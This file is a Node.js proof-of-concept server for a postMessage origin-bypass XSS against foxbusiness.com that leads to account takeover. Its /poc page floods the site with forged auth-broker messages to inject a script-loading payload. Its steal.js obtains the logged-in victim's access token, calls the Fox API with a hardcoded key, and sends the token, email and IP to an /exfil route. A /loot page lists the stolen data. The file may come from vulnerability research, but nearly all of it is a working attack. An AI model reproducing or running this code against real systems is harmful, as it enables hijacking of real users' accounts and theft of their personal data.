/**
 * PostMessage Origin Bypass XSS → Account Takeover PoC Server
 *
 * The postMessage XSS fires JS on www.foxbusiness.com from any origin.
 * Once running, it requests the REAL access token from the xd-channel
 * iframe via silentLogin postMessage, then calls api3.fox.com to
 * read/modify/delete the victim's account.
 *
 * Routes:
 *   GET  /poc           → Attacker page with ATO payload (click "Launch")
 *   GET  /steal.js      → ATO script loaded by the XSS
 *   GET  /exfil         → Receives exfiltrated data (img beacon)
 *   POST /exfil         → Receives exfiltrated data (fetch POST)
 *   GET  /loot          → View all captured account data
 *   GET  /poc-alert     → Original alert-only PoC page
 */

const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const SELF = process.env.RENDER_EXTERNAL_URL || process.env.BASE_URL || `http://localhost:${PORT}`;
const loot = [];

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // ── /steal.js — ATO payload that runs in www.foxbusiness.com context ──
  if (pathname === '/steal.js') {
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'no-cache');
    res.writeHead(200);
    res.end(`
(async function(){
  try {
    var SERVER = '${SELF}';

    // Step 1: Request real token from xd-channel iframe via postMessage
    var tokenData = await new Promise(function(ok, fail) {
      var t = setTimeout(function(){ fail('timeout waiting for silentLogin') }, 8000);
      window.addEventListener('message', function h(e) {
        if (e.origin !== 'https://my.foxbusiness.com') return;
        try {
          var d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
          if (d.name === 'silentLogin' && d.data && d.data.token) {
            clearTimeout(t);
            window.removeEventListener('message', h);
            ok(d.data);
          }
        } catch(x) {}
      });

      // Find or create xd-channel iframe
      var f = document.getElementById('xdchannel');
      if (!f) {
        f = document.createElement('iframe');
        f.id = 'xdchannel';
        f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
        f.style.display = 'none';
        (document.body || document.documentElement).appendChild(f);
        f.onload = function() {
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        };
      } else {
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
      }
    });

    // Step 2: Extract profileId from JWT
    var tk = tokenData.token;
    var parts = tk.split('.');
    var jwtPayload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
    var profileId = jwtPayload.uid;

    // Step 3: Call Fox API to read victim's full profile
    var r = await fetch('https://api3.fox.com/v2.0/update/' + profileId, {
      headers: {
        'Authorization': 'Bearer ' + tk,
        'x-api-key': '4DfS6SQQBOoc2xImxylIam2ri8TXdHQV'
      }
    });
    var profile = await r.json();

    // Step 4: Exfiltrate token + profile to attacker
    await fetch(SERVER + '/exfil', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: tk,
        profileId: profile.profileId,
        email: profile.email,
        displayName: profile.displayName,
        firstName: profile.firstName,
        viewerId: profile.viewerId,
        ipAddress: profile.ipAddress,
        domain: document.domain
      })
    });

    // Visual proof
    document.title = 'ATO: ' + profile.email;
    var b = document.createElement('div');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;background:#d32f2f;color:#fff;padding:16px;font:bold 16px system-ui;text-align:center';
    b.textContent = 'Account Takeover PoC - Stolen: ' + profile.email + ' (' + profile.profileId + ')';
    (document.body || document.documentElement).prepend(b);

  } catch(e) {
    new Image().src = '${SELF}/exfil?err=' + encodeURIComponent(String(e));
  }
})();
`);
    return;
  }

  // ── /poc — Attacker page: postMessage XSS → ATO ───────────────────
  if (pathname === '/poc') {
    res.setHeader('Content-Type', 'text/html');
    res.writeHead(200);
    res.end(`<!DOCTYPE html>
<html>
<head><title>foxbusiness.com PostMessage XSS → Account Takeover</title>
<style>body{font-family:system-ui;max-width:600px;margin:2rem auto;padding:0 1rem}h1{font-size:1.3rem}button{padding:.6rem 1.2rem;font-size:1rem;cursor:pointer;background:#d32f2f;color:#fff;border:none;border-radius:4px}code{background:#f0f0f0;padding:2px 6px;border-radius:3px}.step{margin:1rem 0;padding:.5rem;background:#f9f9f9;border-left:3px solid #d32f2f}</style>
</head>
<body>
<h1>foxbusiness.com PostMessage XSS → Account Takeover</h1>
<p>This PoC exploits the <code>event.data.origin</code> validation bypass in the auth broker to execute JavaScript on <code>www.foxbusiness.com</code>, then steals the victim's access token via the <code>xd-channel.html</code> iframe and calls the Fox API to read their full account.</p>

<div class="step"><strong>Prerequisite:</strong> Victim must be logged into Fox Business.</div>

<button onclick="launchATO()">Launch Account Takeover</button>
<p id="status"></p>

<h3>After clicking:</h3>
<ol>
<li>foxbusiness.com opens in a new tab</li>
<li>PostMessage flood wins race against xd-channel iframe</li>
<li>XSS fires via avatar <code>onerror</code> → loads <code>steal.js</code></li>
<li><code>steal.js</code> requests real token from xd-channel iframe</li>
<li>Token used to call <code>api3.fox.com</code> → full profile read</li>
<li>Stolen data sent to <a href="/loot" target="_blank">/loot</a></li>
</ol>

<script>
var targetWin, flood;

function msg(name, data) {
  return { type:'fnnBrokerResponse', name:name, origin:'https://www.foxbusiness.com', data:data };
}

function atoPayload() {
  return {
    authenticated: true,
    userInfo: {
      'https://foxnews.com/picture': '" onerror="var s=document.createElement(\\'script\\');s.src=\\'${SELF}/steal.js\\';document.head.appendChild(s)" x="',
      'https://foxnews.com/name': 'ATO',
      'https://foxnews.com/email': 'ato@poc.com',
      'https://foxnews.com/uuid': 'poc-uuid'
    },
    token: 'x',
    anon: {
      segment: { lastKnownProfileId:'a', lastAnonymousProfileId:'a', dcg_profile_id:'a' },
      value: 'a'
    }
  };
}

function send(win) {
  var t = 'https://www.foxbusiness.com';
  win.postMessage(msg('ready', null), t);
  win.postMessage(msg('hasPendingPasswordless', false), t);
  win.postMessage(msg('silentLogin', atoPayload()), t);
}

function launchATO() {
  document.getElementById('status').textContent = 'Opening foxbusiness.com...';
  targetWin = window.open('https://www.foxbusiness.com/', '_blank');
  if (!targetWin) { alert('Allow popups for this site'); return; }

  flood = setInterval(function(){ try{send(targetWin)}catch(e){} }, 10);
  setTimeout(function(){
    clearInterval(flood);
    flood = setInterval(function(){ try{send(targetWin)}catch(e){} }, 50);
  }, 2000);
  setTimeout(function(){ clearInterval(flood); }, 15000);

  document.getElementById('status').innerHTML = 'Flooding postMessages... check <a href="/loot" target="_blank">/loot</a> in ~5 seconds.';
}
</script>
</body>
</html>`);
    return;
  }

  // ── /poc-alert — Original alert-only PoC ───────────────────────────
  if (pathname === '/poc-alert') {
    res.setHeader('Content-Type', 'text/html');
    res.writeHead(200);
    res.end(`<!DOCTYPE html>
<html><head><title>foxbusiness.com PostMessage XSS (alert only)</title></head>
<body>
<h1>foxbusiness.com PostMessage XSS</h1>
<button onclick="launchAttack()">Launch XSS (alert)</button>
<script>
function msg(n,d){return{type:'fnnBrokerResponse',name:n,origin:'https://www.foxbusiness.com',data:d}}
function xss(){return{authenticated:true,userInfo:{'https://foxnews.com/picture':'" onerror="alert(document.domain)" x="','https://foxnews.com/name':'XSS','https://foxnews.com/email':'x@x.com','https://foxnews.com/uuid':'x'},token:'x',anon:{segment:{lastKnownProfileId:'a',lastAnonymousProfileId:'a',dcg_profile_id:'a'},value:'a'}}}
function send(w){var t='https://www.foxbusiness.com';w.postMessage(msg('ready',null),t);w.postMessage(msg('hasPendingPasswordless',false),t);w.postMessage(msg('silentLogin',xss()),t)}
function launchAttack(){var w=window.open('https://www.foxbusiness.com/','_blank');if(!w){alert('Allow popups');return}var f=setInterval(function(){try{send(w)}catch(e){}},10);setTimeout(function(){clearInterval(f);f=setInterval(function(){try{send(w)}catch(e){}},50)},2000);setTimeout(function(){clearInterval(f)},15000)}
</script></body></html>`);
    return;
  }

  // ── /exfil — Exfiltration endpoint ─────────────────────────────────
  if (pathname === '/exfil') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', c => body += c);
      req.on('end', () => {
        try {
          const data = JSON.parse(body);
          data._ts = new Date().toISOString();
          data._ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
          loot.push(data);
          if (loot.length > 50) loot.shift();
          console.log(`[LOOT] ${data.email || 'unknown'} | ${data.profileId || '?'}`);
        } catch(e) {}
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"ok":true}');
      });
      return;
    }
    // GET — img beacon or error
    const qs = parsed.query;
    if (qs.err) console.log(`[ERR] ${qs.err}`);
    if (qs.c) {
      const entry = { type: 'beacon', cookie: qs.c, ip: req.headers['x-forwarded-for'], _ts: new Date().toISOString() };
      loot.push(entry);
      console.log(`[BEACON] cookie length=${qs.c.length}`);
    }
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    return;
  }

  // ── /loot — View stolen data ───────────────────────────────────────
  if (pathname === '/loot') {
    res.setHeader('Content-Type', 'application/json');
    res.writeHead(200);
    res.end(JSON.stringify(loot, null, 2));
    return;
  }

  // ── / — Index page ─────────────────────────────────────────────────
  res.setHeader('Content-Type', 'text/html');
  res.writeHead(200);
  res.end(`<h2>PostMessage XSS → ATO PoC</h2>
<ul>
<li><a href="/poc">Account Takeover PoC</a> (for logged-in victims)</li>
<li><a href="/poc-alert">Alert-only PoC</a></li>
<li><a href="/loot">View stolen data</a></li>
</ul>`);
});

server.listen(PORT, () => {
  console.log(`\n  PostMessage XSS → ATO server: ${SELF}`);
  console.log(`  ATO PoC:     ${SELF}/poc`);
  console.log(`  Loot:        ${SELF}/loot`);
  console.log(`  Steal.js:    ${SELF}/steal.js\n`);
});
